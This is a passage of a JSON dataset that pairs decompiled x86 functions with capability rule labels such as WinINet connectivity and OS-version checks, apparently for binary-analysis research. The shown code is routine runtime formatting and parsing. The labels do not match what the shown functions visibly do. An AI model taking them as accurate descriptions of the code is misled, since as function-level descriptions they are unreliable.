{\ncode_r0x0049fbde:\n            param_1[8] = param_1[8] | 0x10;\ncode_r0x0049fbe2:\n            arg_ch_00 = 0;\n            arg_8h_00 = 10;\ncode_r0x0049fbe5:\n            cVar5 = fcn.00402306(arg_8h_00, arg_ch_00);\n        }\n        else if (uVar9 < 0x59) {\n            if (uVar9 == 0x58) {\n                arg_ch_00 = 1;\ncode_r0x0049fb8a:\n                arg_8h_00 = 0x10;\n                goto code_r0x0049fbe5;\n            }\n            if (uVar9 != 0x41) {\n                if (uVar9 == 0x43) goto code_r0x0049fb9e;\n                if (uVar9 < 0x45) goto code_r0x0049fd6e;\n                if (0x47 < uVar9) {\n                    if (uVar9 != 0x53) goto code_r0x0049fd6e;\n                    goto code_r0x0049fb72;\n                }\n            }\ncode_r0x0049fbee:\n            cVar5 = fcn.00404fed();\n        }\n        else if (uVar9 == 0x5a) {\n            cVar5 = fcn.004068d9();\n        }\n        else {\n            if (uVar9 == 0x61) goto code_r0x0049fbee;\n            if (uVar9 != 99) goto code_r0x0049fd6e;\ncode_r0x0049fb9e:\n            cVar5 = fcn.00404007(0);\n        }\n    }\n    else if (uVar9 < 0x71) {\n        if (uVar9 == 0x70) {\n            cVar5 = fcn.00401b9a();\n        }\n        else {\n            if (uVar9 < 0x68) goto code_r0x0049fbee;\n            if (uVar9 == 0x69) goto code_r0x0049fbde;\n            if (uVar9 == 0x6e) {\n                cVar5 = fcn.00404426();\n            }\n            else {\n                if (uVar9 != 0x6f) goto code_r0x0049fd6e;\n                cVar5 = fcn.00402202();\n            }\n        }\n    }\n    else {\n        if (uVar9 != 0x73) {\n            if (uVar9 != 0x75) {\n                if (uVar9 != 0x78) goto code_r0x0049fd6e;\n                arg_ch_00 = 0;\n                goto code_r0x0049fb8a;\n            }\n            goto code_r0x0049fbe2;\n        }\ncode_r0x0049fb72:\n        cVar5 = fcn.00402248();\n    }\n    if ((cVar5 == '\\0') || (*(param_1 + 0xc) != '\\0')) goto code_r0x0049fd6e;\n    arg_ch = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uVar7 = param_1[8];\n    iStack20 = 0;\n    if ((uVar7 >> 4 & 1) != 0) {\n        if ((uVar7 >> 6 & 1) == 0) {\n            if ((uVar7 & 1) == 0) {\n                if ((uVar7 >> 1 & 1) != 0) {\n                    uStack16 = 0x20;\n                    arg_ch = 1;\n                    iStack20 = 1;\n                }\n                goto code_r0x0049fc79;\n            }\n            uVar9 = 0x2b;\n        }\n        else {\n            uVar9 = 0x2d;\n        }\n        uStack16 = uVar9;\n        iStack20 = 1;\n        arg_ch = 1;\n    }\ncode_r0x0049fc79:\n    iVar1 = *(param_1 + 0x32);\n    if (((iVar1 == 0x78) || (iVar1 == 0x58)) && ((uVar7 >> 5 & 1) != 0)) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((iVar1 == 0x61) || (iVar1 == 0x41)) {\n        bVar4 = true;\n    }\n    else {\n        bVar4 = false;\n    }\n    if ((bVar3) || (bVar4)) {\n        *(&stack0xfffffff0 + arg_ch * 2) = 0x30;\n        if ((iVar1 == 0x58) || (uVar8 = 0x78,  iVar1 == 0x41)) {\n            uVar8 = 0x58;\n        }\n        *(&stack0xfffffff2 + arg_ch * 2) = uVar8;\n        arg_ch = arg_ch + 2;\n        iStack20 = arg_ch;\n    }\n    arg_8h = param_1 + 0x112;\n    arg_10h = (param_1[9] - param_1[0xe]) - arg_ch;\n    if ((*(param_1 + 8) & 0xc) == 0) {\n        fcn.00403f2b(arg_8h, 0x20, arg_10h, param_1 + 6);\n        arg_ch = iStack20;\n    }\n    fcn.00402937(&stack0xfffffff0, arg_ch, param_1 + 6);\n    if (((param_1[8] >> 3 & 1) != 0) && ((param_1[8] >> 2 & 1) == 0)) {\n        fcn.00403f2b(arg_8h, 0x30, arg_10h, param_1 + 6);\n    }\n    fcn.0040134d(0);\n    if ((-1 < param_1[6]) && ((param_1[8] >> 2 & 1) != 0)) {\n        fcn.00403f2b(arg_8h, 0x20, arg_10h, param_1 + 6);\n    }\ncode_r0x0049fd6e:\n    uVar7 = fcn.00403085(unaff_ESI);\n    return uVar7;\n}\n",
        "token_count": 2628
    },
    "0040547a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040547a(int32_t param_1)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint16_t *puVar4;\n    int32_t in_stack_ffffffdc;\n    int32_t var_10h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    if ((*(param_1 + 0x3c) == '\\0') || (*(param_1 + 0x38) < 1)) {\n        in_stack_ffffffdc = param_1 + 0xc;\n        fcn.004053da(*(param_1 + 0x34), *(param_1 + 0x38), param_1 + 0x18);\n    }\n    else {\n        puVar4 = *(param_1 + 0x34);\n        iVar3 = 0;\n        do {\n            uVar1 = *puVar4;\n            puVar4 = puVar4 + 1;\n            var_10h = 0;\n            iVar2 = fcn.00401f32(&var_10h, &var_ch, 6, uVar1, *(param_1 + 8));\n            if ((iVar2 != 0) || (var_10h == 0)) {\n                *(param_1 + 0x18) = 0xffffffff;\n                break;\n            }\n            fcn.004053da(&var_ch, var_10h, param_1 + 0x18);\n            iVar3 = iVar3 + 1;\n        } while (iVar3 != *(param_1 + 0x38));\n    }\n    fcn.00403085(in_stack_ffffffdc);\n    return;\n}\n",
        "token_count": 397
    },
    "004054ac": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_30h\n\nvoid __cdecl\nfcn.004054ac(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint noname_8, uint noname_9, uint noname_10, uint arg_34h, uint arg_38h, uint arg_3ch)\n\n{\n    char cVar1;\n    uint arg_8h_00;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint uVar7;\n    char cVar8;\n    int32_t iVar9;\n    int32_t unaff_EBP;\n    code *pcVar10;\n    uint32_t uVar11;\n    int32_t arg_18h_00;\n    char *pcVar12;\n    uint var_ech;\n    uint var_e4h;\n    uint var_dch;\n    uint var_d4h;\n    uint var_cch;\n    uint var_c4h;\n    uint var_bch;\n    uint var_b4h;\n    uint var_ach;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_74h;\n    uint var_70h;\n    uint var_58h;\n    uint var_44h;\n    uint var_40h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.0040536c(0xe0);\n    *(unaff_EBP + -0x8c) = *(unaff_EBP + 0x1c);\n    *(unaff_EBP + -0xa4) = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x98) = *(unaff_EBP + 0x18);\n    *(unaff_EBP + -0x94) = *(unaff_EBP + 0x3c);\n    uVar7 = *(*(unaff_EBP + 0x18) + 0x30);\n    *(unaff_EBP + -4) = 0;\n    fcn.0040327e(uVar7);\n    if (*(unaff_EBP + 0x14) == '\\0') {\n        *(unaff_EBP + -4) = 2;\n        piVar2 = fcn.00401073(unaff_EBP + -0xa0);\n        *(unaff_EBP + -0x74) = piVar2;\n    }\n    else {\n        *(unaff_EBP + -4) = 1;\n        piVar2 = fcn.00405db7(unaff_EBP + -0xa0);\n        *(unaff_EBP + -0x74) = piVar2;\n    }\n    *(unaff_EBP + -4) = 0;\n    fcn.004050a6();\n    pcVar10 = *(*piVar2 + 0x14);\n    (**0x573000)(unaff_EBP + -0x58);\n    (*pcVar10)();\n    *(unaff_EBP + -4) = 3;\n    uVar3 = fcn.004026d0();\n    uVar3 = (uVar3 ^ uVar3 >> 0x1f) - (uVar3 >> 0x1f);\n    *(unaff_EBP + -0x88) = uVar3;\n    if (*(unaff_EBP + 0x34) < uVar3 || *(unaff_EBP + 0x34) == uVar3) {\n        fcn.00404133(0, (uVar3 - *(unaff_EBP + 0x34)) + 1, *(unaff_EBP + -0x94));\n    }\n    else {\n        pcVar12 = unaff_EBP + -0x58;\n        if (0xf < *(unaff_EBP + -0x44)) {\n            pcVar12 = *(unaff_EBP + -0x58);\n        }\n        if (*pcVar12 != '\\x7f') {\n            pcVar12 = unaff_EBP + -0x58;\n            if (0xf < *(unaff_EBP + -0x44)) {\n                pcVar12 = *(unaff_EBP + -0x58);\n            }\n            if ('\\0' < *pcVar12) {\n                uVar3 = fcn.004068ac();\n                pcVar12 = unaff_EBP + -0x58;\n                uVar3 = uVar3 & 0xffff;\n                *(unaff_EBP + -0x7c) = uVar3;\n                if (0xf < *(unaff_EBP + -0x44)) {\n                    pcVar12 = *(unaff_EBP + -0x58);\n                }\n                uVar6 = *(unaff_EBP + 0x34) - *(unaff_EBP + -0x88);\n                while (((cVar8 = *pcVar12,  cVar8 != '\\x7f' && ('\\0' < cVar8)) && (cVar8 < uVar6))) {\n                    uVar6 = uVar6 - cVar8;\n                    fcn.00404133(uVar6, 1, uVar3);\n                    if ('\\0' < pcVar12[1]) {\n                        pcVar12 = pcVar12 + 1;\n                    }\n                    uVar3 = *(unaff_EBP + -0x7c);\n                }\n                uVar3 = *(unaff_EBP + -0x88);\n            }\n        }\n    }\n    *(unaff_EBP + -0x28) = 0;\n    *(unaff_EBP + -0x18) = 0;\n    *(unaff_EBP + -0x14) = 7;\n    *(unaff_EBP + -0x28) = 0;\n    *(unaff_EBP + -4) = 5;\n    if (*(unaff_EBP + 0x20) == '\\0') {\n        pcVar10 = *(**(unaff_EBP + -0x74) + 0x28);\n        (**0x573000)(unaff_EBP + -0x7c);\n        (*pcVar10)();\n        *(unaff_EBP + -0x90) = *(unaff_EBP + -0x7c);\n        pcVar10 = *(**(unaff_EBP + -0x74) + 0x1c);\n    }\n    else {\n        pcVar10 = *(**(unaff_EBP + -0x74) + 0x2c);\n        (**0x573000)();\n        (*pcVar10)();\n        *(unaff_EBP + -0x90) = *(unaff_EBP + -0x7c);\n        pcVar10 = *(**(unaff_EBP + -0x74) + 0x20);\n    }\n    (**0x573000)(unaff_EBP + -0x70);\n    (*pcVar10)();\n    *(unaff_EBP + -0x7c) = 0;\n    uVar7 = *(unaff_EBP + -0x7c);\n    fcn.00404237(unaff_EBP + -0x70);\n    fcn.00402c34(unaff_EBP + -0x70, uVar7);\n    *(unaff_EBP + -0x40) = 0;\n    *(unaff_EBP + -0x30) = 0;\n    *(unaff_EBP + -0x2c) = 7;\n    *(unaff_EBP + -0x40) = 0;\n    *(unaff_EBP + -4) = 7;\n    if ((*(*(unaff_EBP + -0x98) + 0x14) & 8) != 0) {\n        pcVar10 = *(**(unaff_EBP + -0x74) + 0x18);\n        (**0x573000)(unaff_EBP + -0x70);\n        (*pcVar10)();\n        *(unaff_EBP + -0x7c) = 0;\n        uVar7 = *(unaff_EBP + -0x7c);\n        fcn.00404237(unaff_EBP + -0x70);\n        fcn.00402c34(unaff_EBP + -0x70, uVar7);\n    }\n    cVar8 = '\\0';\n    uVar6 = 0;\n    *(unaff_EBP + -0x75) = 0;\n    uVar11 = 0;\n    do {\n        cVar1 = *(unaff_EBP + -0x90 + uVar11);\n        if (cVar1 == ' ') {\n            uVar6 = uVar6 + 1;\ncode_r0x00475050:\n            if (uVar11 != 3) {\n                cVar8 = '\\x01';\n                *(unaff_EBP + -0x75) = 1;\n            }\n        }\n        else if (cVar1 == '$') {\n            uVar6 = uVar6 + *(unaff_EBP + -0x30);\n        }\n        else if (cVar1 == '+') {\n            uVar6 = uVar6 + *(unaff_EBP + -0x18);\n        }\n        else if (cVar1 == 'v') {\n            if (*(unaff_EBP + 0x34) < uVar3 || *(unaff_EBP + 0x34) == uVar3) {\n                iVar9 = (uVar3 - *(unaff_EBP + 0x34)) + 1;\n            }\n            else {\n                iVar9 = 0;\n            }\n            cVar8 = *(unaff_EBP + -0x75);\n            uVar6 = uVar6 + (uVar3 != 0) + *(unaff_EBP + 0x34) + iVar9;\n        }\n        else if (cVar1 == 'x') goto code_r0x00475050;\n        uVar11 = uVar11 + 1;\n    } while (uVar11 < 4);\n    iVar9 = *(unaff_EBP + -0x98);\n    if (((*(iVar9 + 0x24) < 0) || ((*(iVar9 + 0x24) < 1 && (*(iVar9 + 0x20) == 0)))) || (*(iVar9 + 0x20) <= uVar6)) {\n        arg_18h_00 = 0;\n    }\n    else {\n        arg_18h_00 = *(iVar9 + 0x20) - uVar6;\n    }\n    uVar6 = *(iVar9 + 0x14) & 0x1c0;\n    *(unaff_EBP + -0x9c) = uVar6;\n    if ((uVar6 == 0x40) || ((uVar6 == 0x100 && (cVar8 != '\\0')))) {\n        iVar9 = *(unaff_EBP + 0x10);\n        var_28h = *(unaff_EBP + 0xc);\n    }\n    else {\n        piVar2 = fcn.004046f1(unaff_EBP + -0x80, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), *(unaff_EBP + -0x8c), \n                              arg_18h_00);\n        arg_18h_00 = 0;\n        var_28h = *piVar2;\n        iVar9 = piVar2[1];\n        *(unaff_EBP + 0xc) = var_28h;\n        *(unaff_EBP + 0x10) = iVar9;\n    }\n    uVar6 = 0;\n    *(unaff_EBP + -0x7c) = 0;\n    do {\n        cVar8 = *(unaff_EBP + -0x90 + uVar6);\n        if (cVar8 == ' ') {\n            piVar2 = fcn.004046f1(unaff_EBP + -0xec, var_28h, iVar9, *(unaff_EBP + -0x8c), 1);\n            var_28h = *piVar2;\n            iVar9 = piVar2[1];\n            *(unaff_EBP + 0xc) = var_28h;\n            *(unaff_EBP + 0x10) = iVar9;\ncode_r0x0047528b:\n            if (*(unaff_EBP + -0x9c) != 0x100) goto code_r0x004752bc;\n            piVar2 = fcn.004046f1(unaff_EBP + -0xac, var_28h, iVar9, *(unaff_EBP + -0x8c), arg_18h_00);\n            arg_18h_00 = 0;\ncode_r0x004752b1:\n            var_28h = *piVar2;\n            iVar9 = piVar2[1];\n            *(unaff_EBP + 0x10) = iVar9;\n            *(unaff_EBP + 0xc) = var_28h;\n        }\n        else {\n            if (cVar8 == '$') {\n                uVar6 = unaff_EBP - 0x40;\n                if (7 < *(unaff_EBP + -0x2c)) {\n                    uVar6 = *(unaff_EBP + -0x40);\n                }\n                uVar11 = *(unaff_EBP + -0x30);\n                iVar5 = unaff_EBP + -0xe4;\ncode_r0x0047521c:\n                piVar2 = fcn.004032d8(iVar5, var_28h, iVar9, uVar6, uVar11);\n                goto code_r0x004752b1;\n            }\n            if (cVar8 == '+') {\n                if (*(unaff_EBP + -0x18) != 0) {\n                    uVar6 = unaff_EBP - 0x28;\n                    if (7 < *(unaff_EBP + -0x14)) {\n                        uVar6 = *(unaff_EBP + -0x28);\n                    }\n                    uVar11 = 1;\n                    iVar5 = unaff_EBP + -0xdc;\n                    goto code_r0x0047521c;\n                }\n            }\n            else {\n                if (cVar8 == 'v') {\n                    if (uVar3 == 0) {\n                        uVar6 = unaff_EBP + 0x24;\n                        if (7 < *(unaff_EBP + 0x38)) {\n                            uVar6 = *(unaff_EBP + 0x24);\n                        }\n                        uVar11 = *(unaff_EBP + 0x34);\n                        iVar5 = unaff_EBP + -0xb4;\n                    }\n                    else if (*(unaff_EBP + 0x34) < uVar3 || *(unaff_EBP + 0x34) == uVar3) {\n                        uVar11 = *(unaff_EBP + -0x94);\n                        fcn.0040637f(uVar11);\n                        uVar6 = fcn.00402860();\n                        uVar6 = uVar6 & 0xffff;\n                        fcn.0040637f(uVar6);\n                        puVar4 = fcn.004046f1(unaff_EBP + -0xbc, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), \n                                              *(unaff_EBP + -0x94), uVar3 - *(unaff_EBP + 0x34));\n                        uVar7 = puVar4[1];\n                        var_28h = unaff_EBP + 0x24;\n                        *(unaff_EBP + 0xc) = *puVar4;\n                        *(unaff_EBP + 0x10) = uVar7;\n                        if (7 < *(unaff_EBP + 0x38)) {\n                            var_28h = *(unaff_EBP + 0x24);\n                        }\n                        iVar9 = *(unaff_EBP + 0x34);\n                        iVar5 = unaff_EBP + -0xc4;\n                    }\n                    else {\n                        iVar5 = *(unaff_EBP + 0x34) - uVar3;\n                        *(unaff_EBP + -0x84) = unaff_EBP + 0x24;\n                        uVar3 = *(unaff_EBP + -0x88);\n                        if (7 < *(unaff_EBP + 0x38)) {\n                            *(unaff_EBP + -0x84) = *(unaff_EBP + 0x24);\n                            uVar3 = *(unaff_EBP + -0x88);\n                        }\n                        puVar4 = fcn.004032d8(unaff_EBP + -0xcc, var_28h, iVar9, *(unaff_EBP + -0x84), iVar5);\n                        uVar7 = puVar4[1];\n                        *(unaff_EBP + 0xc) = *puVar4;\n                        *(unaff_EBP + 0x10) = uVar7;\n                        uVar11 = fcn.00402860();\n                        uVar11 = uVar11 & 0xffff;\n                        fcn.0040637f(uVar11);\n                        iVar9 = unaff_EBP + 0x24;\n                        if (7 < *(unaff_EBP + 0x38)) {\n                            iVar9 = *(unaff_EBP + 0x24);\n                        }\n                        iVar9 = iVar9 + (*(unaff_EBP + 0x34) - uVar3) * 2;\n                        var_28h = *(unaff_EBP + 0x10);\n                        iVar5 = unaff_EBP + -0xd4;\n                        uVar6 = uVar3;\n                    }\n                    goto code_r0x0047521c;\n                }\n                if (cVar8 == 'x') goto code_r0x0047528b;\n            }\n        }\ncode_r0x004752bc:\n        uVar6 = *(unaff_EBP + -0x7c) + 1;\n        *(unaff_EBP + -0x7c) = uVar6;\n        if (3 < uVar6) {\n            if (1 < *(unaff_EBP + -0x18)) {\n                iVar5 = unaff_EBP + -0x28;\n                if (7 < *(unaff_EBP + -0x14)) {\n                    iVar5 = *(unaff_EBP + -0x28);\n                }\n                piVar2 = fcn.004032d8(unaff_EBP + -0xac, var_28h, iVar9, iVar5 + 2, *(unaff_EBP + -0x18) - 1);\n                var_28h = *piVar2;\n                iVar9 = piVar2[1];\n                *(unaff_EBP + 0xc) = var_28h;\n                *(unaff_EBP + 0x10) = iVar9;\n            }\n            iVar5 = *(unaff_EBP + -0x98);\n            uVar7 = *(unaff_EBP + -0x8c);\n            arg_8h_00 = *(unaff_EBP + -0xa4);\n            *(iVar5 + 0x20) = 0;\n            *(iVar5 + 0x24) = 0;\n            fcn.004046f1(arg_8h_00, var_28h, iVar9, uVar7, arg_18h_00);\n            if (7 < *(unaff_EBP + -0x2c)) {\n                uVar7 = *(unaff_EBP + -0x40);\n                uVar3 = *(unaff_EBP + -0x2c) * 2 + 2;\n                *(unaff_EBP + -0x7c) = uVar3;\n                *(unaff_EBP + -0x84) = uVar7;\n                if (0xfff < uVar3) {\n                    fcn.00404070(unaff_EBP + -0x84, unaff_EBP + -0x7c);\n                    uVar7 = *(unaff_EBP + -0x84);\n                }\n                fcn.00401a32(uVar7);\n            }\n            *(unaff_EBP + -0x30) = 0;\n            *(unaff_EBP + -0x40) = 0;\n            *(unaff_EBP + -0x2c) = 7;\n            if (7 < *(unaff_EBP + -0x14)) {\n                uVar7 = *(unaff_EBP + -0x28);\n                uVar3 = *(unaff_EBP + -0x14) * 2 + 2;\n                *(unaff_EBP + -0x7c) = uVar3;\n                *(unaff_EBP + -0x84) = uVar7;\n                if (0xfff < uVar3) {\n                    fcn.00404070(unaff_EBP + -0x84, unaff_EBP + -0x7c);\n                    uVar7 = *(unaff_EBP + -0x84);\n                }\n                fcn.00401a32(uVar7);\n            }\n            *(unaff_EBP + -0x18) = 0;\n            *(unaff_EBP + -0x14) = 7;\n            *(unaff_EBP + -0x28) = 0;\n            fcn.004029b9();\n            fcn.00402c34();\n            fcn.004067d0();\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 4949
    },
    "004054cf": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004054cf(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        *arg_8h = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar1 = *(in_ECX + 0xaa8);\n        if (99 < uVar1) {\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.0040288d(in_ECX + 0x464 + uVar1 * 0x10, 3, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        *arg_8h = **(in_ECX + 0x46c + uVar1 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 298
    },
    "0040551a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040551a(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    int32_t in_ECX;\n    uint32_t var_4h;\n    \n    piVar2 = *(in_ECX + 0xc);\n    if (piVar2 == NULL) {\n        piVar2 = fcn.004039a4();\n        *(in_ECX + 0xc) = piVar2;\n    }\n    iVar1 = *piVar2;\n    *piVar2 = 0;\n    var_4h = 0;\n    uVar3 = fcn.004048e5(*(in_ECX + 0x10) + -1, &var_4h, 10);\n    *arg_8h = uVar3;\n    piVar4 = *(in_ECX + 0xc);\n    if (piVar4 == NULL) {\n        piVar4 = fcn.004039a4();\n        *(in_ECX + 0xc) = piVar4;\n    }\n    if ((*piVar4 == 0x22) || (var_4h < *(in_ECX + 0x10))) {\n        uVar3 = 0;\n    }\n    else {\n        *(in_ECX + 0x10) = var_4h;\n        uVar3 = 1;\n    }\n    if ((*piVar2 == 0) && (iVar1 != 0)) {\n        *piVar2 = iVar1;\n    }\n    return uVar3;\n}\n",
        "token_count": 356
    },
    "004055ba": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004055ba(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint uVar4;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 8;\n        iVar1 = *(in_ECX + 0x14);\n        *arg_8h = *(iVar1 + -8);\n        arg_8h[1] = *(iVar1 + -4);\n    }\n    else {\n        uVar2 = *(in_ECX + 0xaa8);\n        if (99 < uVar2) {\n            puVar3 = fcn.004039a4();\n            *puVar3 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar4 = fcn.0040288d(in_ECX + 0x464 + uVar2 * 0x10, 2, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar4;\n        }\n        puVar3 = *(in_ECX + 0x46c + uVar2 * 0x10);\n        *arg_8h = *puVar3;\n        arg_8h[1] = puVar3[1];\n    }\n    return 1;\n}\n",
        "token_count": 351
    },
    "004055dd": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ah\n// WARNING: Variable defined which should be unmapped: var_16h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004055dd(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    char cVar1;\n    int32_t arg_10h_00;\n    code *pcVar2;\n    char cVar3;\n    int16_t iVar4;\n    int32_t *piVar5;\n    uchar *puVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    char **ppcVar10;\n    int16_t iVar11;\n    char *pcVar12;\n    int32_t unaff_EBP;\n    char *pcVar13;\n    int32_t iVar14;\n    char *pcVar15;\n    uint uVar16;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_68h;\n    uint var_60h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_1ah;\n    uint var_16h;\n    uint var_4h;\n    \n    fcn.0040536c(0x8c);\n    iVar14 = *(unaff_EBP + 0x18);\n    uVar7 = *(iVar14 + 0x14);\n    arg_10h_00 = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -0x84) = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x68) = *(unaff_EBP + 0x14);\n    *(unaff_EBP + -0x90) = *(unaff_EBP + 0x1c);\n    if ((uVar7 & 0x3000) == 0x3000) {\n        fcn.004064ce(*(unaff_EBP + 8), *(unaff_EBP + 0xc), arg_10h_00, *(unaff_EBP + 0x14), iVar14, *(unaff_EBP + 0x1c))\n        ;\n        goto code_r0x0046ea81;\n    }\n    fcn.0040327e(*(iVar14 + 0x30));\n    *(unaff_EBP + -4) = 0;\n    piVar5 = fcn.004053a8(unaff_EBP + -0x8c);\n    *(unaff_EBP + -4) = 0xffffffff;\n    *(unaff_EBP + -0x94) = piVar5;\n    fcn.004050a6();\n    pcVar2 = *(*piVar5 + 0x14);\n    (**0x573000)(unaff_EBP + -0x60);\n    (*pcVar2)();\n    uVar16 = *(iVar14 + 0x30);\n    *(unaff_EBP + -4) = 1;\n    *(unaff_EBP + -0x74) = *(unaff_EBP + -0x84);\n    *(unaff_EBP + -99) = 0;\n    *(unaff_EBP + -0x62) = 0;\n    fcn.0040327e(uVar16);\n    *(unaff_EBP + -4) = 2;\n    piVar5 = fcn.0040342c(unaff_EBP + -0x8c);\n    *(unaff_EBP + -4) = 1;\n    fcn.004050a6();\n    pcVar2 = *(*piVar5 + 0x2c);\n    (**0x573000)(\"0123456789-+Ee\", 0x54e46f, unaff_EBP + -0x30);\n    (*pcVar2)();\n    uVar16 = *(unaff_EBP + -0x68);\n    cVar3 = fcn.00401a9b(uVar16);\n    if (cVar3 == '\\0') {\n        if (*(arg_10h_00 + 4) == '\\0') {\n            fcn.00405c40();\n        }\n        iVar11 = *(arg_10h_00 + 6);\n        if (iVar11 == *(unaff_EBP + -0x1a)) {\n            puVar6 = *(unaff_EBP + -0x84);\n            *puVar6 = 0x2b;\n        }\n        else {\n            if (*(arg_10h_00 + 4) == '\\0') {\n                fcn.00405c40();\n                iVar11 = *(arg_10h_00 + 6);\n            }\n            if (iVar11 != *(unaff_EBP + -0x1c)) goto code_r0x0046e4f1;\n            puVar6 = *(unaff_EBP + -0x84);\n            *puVar6 = 0x2d;\n        }\n        puVar6 = puVar6 + 1;\n        fcn.004047a5();\n    }\n    else {\ncode_r0x0046e4f1:\n        puVar6 = *(unaff_EBP + -0x74);\n    }\n    piVar5 = *(unaff_EBP + -0x90);\n    *puVar6 = 0x30;\n    *(unaff_EBP + -0x88) = puVar6;\n    pcVar13 = puVar6 + 1;\n    *(unaff_EBP + -0x74) = pcVar13;\n    iVar14 = *piVar5;\n    *(unaff_EBP + -0x61) = 0;\n    *(unaff_EBP + -0x7c) = 0;\n    *(unaff_EBP + -0x70) = 0;\n    *(unaff_EBP + -0x98) = ((iVar14 != 1000000000) - 1 & 0x2dc) + 0x24;\n    pcVar15 = unaff_EBP + -0x60;\n    *(unaff_EBP + -0x78) = pcVar15;\n    if (0xf < *(unaff_EBP + -0x4c)) {\n        pcVar15 = *(unaff_EBP + -0x60);\n        *(unaff_EBP + -0x78) = pcVar15;\n    }\n    if ((*pcVar15 == '\\x7f') || (*pcVar15 < '\\x01')) {\n        cVar3 = fcn.00401a9b(uVar16);\n        if (cVar3 == '\\0') {\n            do {\n                if (*(arg_10h_00 + 4) == '\\0') {\n                    fcn.00405c40();\n                }\n                uVar7 = fcn.00403710(unaff_EBP + -0x30, *(arg_10h_00 + 6));\n                if (9 < uVar7) break;\n                iVar14 = *(unaff_EBP + -0x7c);\n                if (*(unaff_EBP + -0x98) == iVar14 || *(unaff_EBP + -0x98) < iVar14) {\n                    *(unaff_EBP + -0x70) = *(unaff_EBP + -0x70) + 1;\n                    if (uVar7 != 0) {\n                        